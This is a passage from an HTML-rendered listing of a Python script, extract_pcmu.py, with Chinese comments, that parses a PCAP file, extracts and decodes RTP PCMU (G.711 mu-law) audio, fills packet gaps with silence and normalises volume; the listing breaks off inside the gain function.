</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span><span class="lnt">360
</span><span class="lnt">361
</span><span class="lnt">362
</span><span class="lnt">363
</span><span class="lnt">364
</span><span class="lnt">365
</span><span class="lnt">366
</span><span class="lnt">367
</span><span class="lnt">368
</span><span class="lnt">369
</span><span class="lnt">370
</span><span class="lnt">371
</span><span class="lnt">372
</span><span class="lnt">373
</span><span class="lnt">374
</span><span class="lnt">375
</span><span class="lnt">376
</span><span class="lnt">377
</span><span class="lnt">378
</span><span class="lnt">379
</span><span class="lnt">380
</span><span class="lnt">381
</span><span class="lnt">382
</span><span class="lnt">383
</span><span class="lnt">384
</span><span class="lnt">385
</span><span class="lnt">386
</span><span class="lnt">387
</span><span class="lnt">388
</span><span class="lnt">389
</span><span class="lnt">390
</span><span class="lnt">391
</span><span class="lnt">392
</span><span class="lnt">393
</span><span class="lnt">394
</span><span class="lnt">395
</span><span class="lnt">396
</span><span class="lnt">397
</span><span class="lnt">398
</span><span class="lnt">399
</span><span class="lnt">400
</span><span class="lnt">401
</span><span class="lnt">402
</span><span class="lnt">403
</span><span class="lnt">404
</span><span class="lnt">405
</span><span class="lnt">406
</span><span class="lnt">407
</span><span class="lnt">408
</span><span class="lnt">409
</span><span class="lnt">410
</span><span class="lnt">411
</span><span class="lnt">412
</span><span class="lnt">413
</span><span class="lnt">414
</span><span class="lnt">415
</span><span class="lnt">416
</span><span class="lnt">417
</span><span class="lnt">418
</span><span class="lnt">419
</span><span class="lnt">420
</span><span class="lnt">421
</span><span class="lnt">422
</span><span class="lnt">423
</span><span class="lnt">424
</span><span class="lnt">425
</span><span class="lnt">426
</span><span class="lnt">427
</span><span class="lnt">428
</span><span class="lnt">429
</span><span class="lnt">430
</span><span class="lnt">431
</span><span class="lnt">432
</span><span class="lnt">433
</span><span class="lnt">434
</span><span class="lnt">435
</span><span class="lnt">436
</span><span class="lnt">437
</span><span class="lnt">438
</span><span class="lnt">439
</span><span class="lnt">440
</span><span class="lnt">441
</span><span class="lnt">442
</span><span class="lnt">443
</span><span class="lnt">444
</span><span class="lnt">445
</span><span class="lnt">446
</span><span class="lnt">447
</span><span class="lnt">448
</span><span class="lnt">449
</span><span class="lnt">450
</span><span class="lnt">451
</span><span class="lnt">452
</span><span class="lnt">453
</span><span class="lnt">454
</span><span class="lnt">455
</span><span class="lnt">456
</span><span class="lnt">457
</span><span class="lnt">458
</span><span class="lnt">459
</span><span class="lnt">460
</span><span class="lnt">461
</span><span class="lnt">462
</span><span class="lnt">463
</span><span class="lnt">464
</span><span class="lnt">465
</span><span class="lnt">466
</span><span class="lnt">467
</span><span class="lnt">468
</span><span class="lnt">469
</span><span class="lnt">470
</span><span class="lnt">471
</span><span class="lnt">472
</span><span class="lnt">473
</span><span class="lnt">474
</span><span class="lnt">475
</span><span class="lnt">476
</span><span class="lnt">477
</span><span class="lnt">478
</span><span class="lnt">479
</span><span class="lnt">480
</span><span class="lnt">481
</span><span class="lnt">482
</span><span class="lnt">483
</span><span class="lnt">484
</span><span class="lnt">485
</span><span class="lnt">486
</span><span class="lnt">487
</span><span class="lnt">488
</span><span class="lnt">489
</span><span class="lnt">490
</span><span class="lnt">491
</span><span class="lnt">492
</span><span class="lnt">493
</span><span class="lnt">494
</span><span class="lnt">495
</span><span class="lnt">496
</span><span class="lnt">497
</span><span class="lnt">498
</span><span class="lnt">499
</span><span class="lnt">500
</span><span class="lnt">501
</span><span class="lnt">502
</span><span class="lnt">503
</span><span class="lnt">504
</span><span class="lnt">505
</span><span class="lnt">506
</span><span class="lnt">507
</span><span class="lnt">508
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="cl"><span class="c1"># extract_pcmu.py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 从经典PCAP(小端)中提取 RTP(PCMU, PT=0)：</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - 正常音频：丢弃重复包（与原逻辑一致），丢包静音补洞 -&gt; 放大音量 -&gt; 去静音 -&gt; 导出单条 -&gt; 合成总音频</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - 重复包音频：不丢弃重复包，仅把“重复包”按同样逻辑单独拼接为重复音轨 -&gt; 放大音量 -&gt; 去静音 -&gt; 导出单条 -&gt; 合成总音频</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - 生成“非RTP/非PCMU”排查报告 TXT</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">io</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">wave</span><span class="o">,</span> <span class="nn">datetime</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">Counter</span><span class="p">,</span> <span class="n">defaultdict</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ========= 配置 =========</span>
</span></span><span class="line"><span class="cl"><span class="n">PCAP_PATH</span> <span class="o">=</span> <span class="s1">&#39;Data.pcap&#39;</span>     <span class="c1"># 你的 pcap 文件 (经典PCAP小端)</span>
</span></span><span class="line"><span class="cl"><span class="n">OUT_DIR</span>   <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;output4&#34;</span>      <span class="c1"># 正常音频输出目录</span>
</span></span><span class="line"><span class="cl"><span class="n">DUP_DIR</span>   <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;output4_dups&#34;</span> <span class="c1"># 重复包音频输出目录</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 合成总音频</span>
</span></span><span class="line"><span class="cl"><span class="n">COMBINED_MAIN</span> <span class="o">=</span> <span class="s2">&#34;combined_by_ports.wav&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">COMBINED_DUP</span>  <span class="o">=</span> <span class="s2">&#34;combined_by_ports_dups.wav&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">GAP_SECONDS</span>   <span class="o">=</span> <span class="mf">2.0</span>          <span class="c1"># 合成段间静音（秒）</span>
</span></span><span class="line"><span class="cl"><span class="n">SAMPLE_RATE</span>   <span class="o">=</span> <span class="mi">8000</span>         <span class="c1"># 统一 8kHz, mono, 16-bit</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 音量放大参数</span>
</span></span><span class="line"><span class="cl"><span class="n">USE_TARGET_PEAK</span> <span class="o">=</span> <span class="kc">True</span>       <span class="c1"># True: 峰值规整化；False: 固定 dB 增益</span>
</span></span><span class="line"><span class="cl"><span class="n">TARGET_PEAK</span>     <span class="o">=</span> <span class="mf">0.98</span>       <span class="c1"># 目标峰值（相对 32767），0.98 ≈ -0.18 dBFS</span>
</span></span><span class="line"><span class="cl"><span class="n">FIXED_GAIN_DB</span>   <span class="o">=</span> <span class="mf">6.0</span>        <span class="c1"># 若不用目标峰值，则使用固定增益（dB）</span>
</span></span><span class="line"><span class="cl"><span class="n">CLIP_PROTECT</span>    <span class="o">=</span> <span class="mf">0.999</span>      <span class="c1"># 额外防削波系数</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 静音剔除（VAD）参数 —— 尽量不影响有声段</span>
</span></span><span class="line"><span class="cl"><span class="n">FRAME_MS</span> <span class="o">=</span> <span class="mi">20</span>                  <span class="c1"># 帧长（毫秒）</span>
</span></span><span class="line"><span class="cl"><span class="n">HOP_MS</span>   <span class="o">=</span> <span class="mi">10</span>                  <span class="c1"># 帧移（毫秒）</span>
</span></span><span class="line"><span class="cl"><span class="n">SILENCE_THRESHOLD_DBFS</span> <span class="o">=</span> <span class="o">-</span><span class="mf">35.0</span> <span class="c1"># 静音阈值（dBFS）</span>
</span></span><span class="line"><span class="cl"><span class="n">HYSTERESIS_DB</span> <span class="o">=</span> <span class="mf">3.0</span>            <span class="c1"># 滞后带（进入/离开语音的门限差）</span>
</span></span><span class="line"><span class="cl"><span class="n">MIN_VOICE_MS</span> <span class="o">=</span> <span class="mi">60</span>              <span class="c1"># 最短保留语音段（毫秒）</span>
</span></span><span class="line"><span class="cl"><span class="n">MERGE_GAP_MS</span> <span class="o">=</span> <span class="mi">50</span>              <span class="c1"># 两语音段间隙小于该值则合并（毫秒）</span>
</span></span><span class="line"><span class="cl"><span class="n">LEAD_PAD_MS</span>  <span class="o">=</span> <span class="mi">20</span>              <span class="c1"># 每段语音前保留的缓冲（毫秒）</span>
</span></span><span class="line"><span class="cl"><span class="n">TAIL_PAD_MS</span>  <span class="o">=</span> <span class="mi">40</span>              <span class="c1"># 每段语音后保留的缓冲（毫秒）</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 丢包/重复判断参数</span>
</span></span><span class="line"><span class="cl"><span class="n">MAX_GAP_PACKETS</span>   <span class="o">=</span> <span class="mi">1000</span>       <span class="c1"># 小于该缺口视作丢包并静音补洞</span>
</span></span><span class="line"><span class="cl"><span class="n">FALLBACK_PL_SIZE</span>  <span class="o">=</span> <span class="mi">160</span>        <span class="c1"># 兜底负载长度（20ms @ 8kHz）</span>
</span></span><span class="line"><span class="cl"><span class="n">REPORT_NAME</span>       <span class="o">=</span> <span class="s2">&#34;non_pcmu_report.txt&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ========================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">OUT_DIR</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">DUP_DIR</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">REPORT_PATH</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">OUT_DIR</span><span class="p">,</span> <span class="n">REPORT_NAME</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --------------- 基础解析 ---------------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_pcap_bytes</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">PCAP_PATH</span> <span class="ow">and</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">PCAP_PATH</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">PCAP_PATH</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">FileNotFoundError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;找不到 PCAP 路径：</span><span class="si">{</span><span class="n">PCAP_PATH</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_pcap_le</span><span class="p">(</span><span class="n">buf</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># PCAP 全局头 24 字节，小端魔数 0xD4C3B2A1</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">24</span> <span class="ow">or</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">!=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xD4\xC3\xB2\xA1</span><span class="s2">&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;不是经典PCAP(小端)；请用 Wireshark -&gt; Save As -&gt; pcap(libpcap) 转存再试&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">off</span> <span class="o">=</span> <span class="mi">24</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">off</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">&lt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">ts_sec</span><span class="p">,</span> <span class="n">ts_usec</span><span class="p">,</span> <span class="n">incl_len</span><span class="p">,</span> <span class="n">orig_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;&lt;IIII&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">off</span><span class="p">:</span><span class="n">off</span><span class="o">+</span><span class="mi">16</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">off</span> <span class="o">+=</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">        <span class="n">pkt</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="n">off</span><span class="p">:</span><span class="n">off</span><span class="o">+</span><span class="n">incl_len</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">off</span> <span class="o">+=</span> <span class="n">incl_len</span>
</span></span><span class="line"><span class="cl">        <span class="k">yield</span> <span class="n">pkt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_eth</span><span class="p">(</span><span class="n">pkt</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">pkt</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">14</span><span class="p">:</span> <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">et</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;!6s6sH&#34;</span><span class="p">,</span> <span class="n">pkt</span><span class="p">[:</span><span class="mi">14</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">et</span><span class="p">,</span> <span class="n">pkt</span><span class="p">[</span><span class="mi">14</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_ipv4</span><span class="p">(</span><span class="n">payload</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">:</span> <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="n">vihl</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">version</span> <span class="o">=</span> <span class="n">vihl</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">    <span class="n">ihl</span> <span class="o">=</span> <span class="p">(</span><span class="n">vihl</span> <span class="o">&amp;</span> <span class="mh">0x0F</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">version</span> <span class="o">!=</span> <span class="mi">4</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">ihl</span><span class="p">:</span> <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="n">total_length</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;!H&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">proto</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">proto</span><span class="p">,</span> <span class="n">payload</span><span class="p">[</span><span class="n">ihl</span><span class="p">:</span><span class="n">total_length</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_udp</span><span class="p">(</span><span class="n">seg</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">seg</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span> <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="n">srcp</span><span class="p">,</span> <span class="n">dstp</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">checksum</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;!HHHH&#34;</span><span class="p">,</span> <span class="n">seg</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">length</span> <span class="o">&lt;</span> <span class="mi">8</span> <span class="ow">or</span> <span class="n">length</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">seg</span><span class="p">):</span> <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">srcp</span><span class="p">,</span> <span class="n">dstp</span><span class="p">,</span> <span class="n">seg</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="n">length</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_rtp</span><span class="p">(</span><span class="n">payload</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># RTP v2 最小 12 字节</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">:</span> <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xC0</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x80</span><span class="p">:</span> <span class="k">return</span> <span class="kc">None</span>  <span class="c1"># Version=2</span>
</span></span><span class="line"><span class="cl">    <span class="n">cc</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x0F</span>
</span></span><span class="line"><span class="cl">    <span class="n">pt</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x7F</span>
</span></span><span class="line"><span class="cl">    <span class="n">seq</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;!H&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">ts</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;!I&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">ssrc</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;!I&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">12</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">hdr_len</span> <span class="o">=</span> <span class="mi">12</span> <span class="o">+</span> <span class="n">cc</span> <span class="o">*</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 头扩展</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x10</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">hdr_len</span> <span class="o">+</span> <span class="mi">4</span><span class="p">:</span> <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        <span class="n">ext_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;!H&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">[</span><span class="n">hdr_len</span><span class="o">+</span><span class="mi">2</span><span class="p">:</span><span class="n">hdr_len</span><span class="o">+</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">        <span class="n">hdr_len</span> <span class="o">+=</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">ext_len</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">hdr_len</span><span class="p">:</span> <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;pt&#34;</span><span class="p">:</span> <span class="n">pt</span><span class="p">,</span> <span class="s2">&#34;seq&#34;</span><span class="p">:</span> <span class="n">seq</span><span class="p">,</span> <span class="s2">&#34;ts&#34;</span><span class="p">:</span> <span class="n">ts</span><span class="p">,</span> <span class="s2">&#34;ssrc&#34;</span><span class="p">:</span> <span class="n">ssrc</span><span class="p">,</span> <span class="s2">&#34;payload&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">[</span><span class="n">hdr_len</span><span class="p">:]}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --------------- G.711 PCMU 解码 ---------------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mulaw_decode_table</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">lut</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">int16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">=</span> <span class="n">i</span> <span class="o">^</span> <span class="mh">0xFF</span>  <span class="c1"># PCMU 8bit 为反码</span>
</span></span><span class="line"><span class="cl">        <span class="n">sign</span> <span class="o">=</span> <span class="n">b</span> <span class="o">&amp;</span> <span class="mh">0x80</span>
</span></span><span class="line"><span class="cl">        <span class="n">exponent</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x07</span>
</span></span><span class="line"><span class="cl">        <span class="n">mantissa</span> <span class="o">=</span> <span class="n">b</span> <span class="o">&amp;</span> <span class="mh">0x0F</span>
</span></span><span class="line"><span class="cl">        <span class="n">sample</span> <span class="o">=</span> <span class="p">(((</span><span class="n">mantissa</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">|</span> <span class="mi">132</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">exponent</span><span class="p">)</span> <span class="o">-</span> <span class="mi">132</span>  <span class="c1"># 132 = 0x84</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">sign</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">sample</span> <span class="o">=</span> <span class="o">-</span><span class="n">sample</span>
</span></span><span class="line"><span class="cl">        <span class="n">lut</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">int16</span><span class="p">(</span><span class="n">sample</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">lut</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">LUT</span> <span class="o">=</span> <span class="n">mulaw_decode_table</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">PCMU_SILENCE_BYTE</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xFF</span><span class="s1">&#39;</span>  <span class="c1"># μ-law 静音（解码约为 0）</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decode_mulaw</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">np</span><span class="o">.</span><span class="n">ndarray</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">u</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">frombuffer</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">LUT</span><span class="p">[</span><span class="n">u</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --------------- 音频处理 ---------------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">apply_gain</span><span class="p">(</span><span class="n">pcm</span><span class="p">:</span> <span class="n">np</span><span class="o">.</span><span class="n">ndarray</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">np</span><span class="o">.</span><span class="n">ndarray</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;峰值规整化/固定增益 + 防削波&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pcm</span><span class="o">.</span><span class="n">size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">pcm</span>
</span></span><span class="line"><span class="cl">    <span class="n">pcm_f</span> <span class="o">=</span> <span class="n">pcm</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">USE_TARGET_PEAK</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">peak</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">max</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">pcm_f</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">peak</span> <span class="o">&lt;=</span> <span class="mf">0.0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">pcm</span>
</span></span><span class="line"><span class="cl">        <span class="n">target_amp</span> <span class="o">=</span> <span class="mf">32767.0</span> <span class="o">*</span> <span class="n">TARGET_PEAK</span> <span class="o">*</span> <span class="n">CLIP_PROTECT</span>
</span></span><span class="line"><span class="cl">        <span class="n">gain</span> <span class="o">=</span> <span class="n">target_amp</span> <span class="o">/</span> <span class="n">peak</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">gain</span> <span class="o">=</span> <span class="mf">10.0</span> <span class="o">**</span> <span class="p">(</span><span class="n">FIXED_GAIN_DB</span> <span class="o">/</span> <span class="mf">20.0</span><span class="p">)</span>
